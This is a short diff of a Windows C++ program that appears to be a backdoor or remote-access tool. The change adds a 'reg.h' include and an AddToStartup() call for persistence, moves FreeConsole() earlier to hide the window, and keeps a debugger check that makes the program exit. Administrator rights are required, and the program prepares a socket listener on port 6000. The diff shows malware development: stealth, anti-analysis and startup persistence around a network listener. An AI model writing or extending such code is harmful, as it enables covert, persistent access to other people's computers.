@@ -6,6 +6,7 @@
 #include <iostream>
 #include <sys/stat.h>
 #include "anti-debug.h"
+#include "reg.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -28,18 +29,19 @@ BOOL IsRunAsAdmin(); //function to check if the program is running as admin
 void ShowErrorMessage(const wchar_t* message); //function to show an error message
 int main() //the main function
 {
+    //hide console
+   FreeConsole();
     //check if debugger is present
-    if(CheckDebugger()) {
+   if (CheckDebugger()) {
 		return EXIT_FAILURE;
 	}
-
+    
    if (!IsRunAsAdmin())
     {
         ShowErrorMessage(L"Please run the program as administrator.");
         return 1;
     }
-    //hide console
-    FreeConsole();
+    AddToStartup();
     //set listen port
     port = 6000;
     //tell windows we want to use sockets
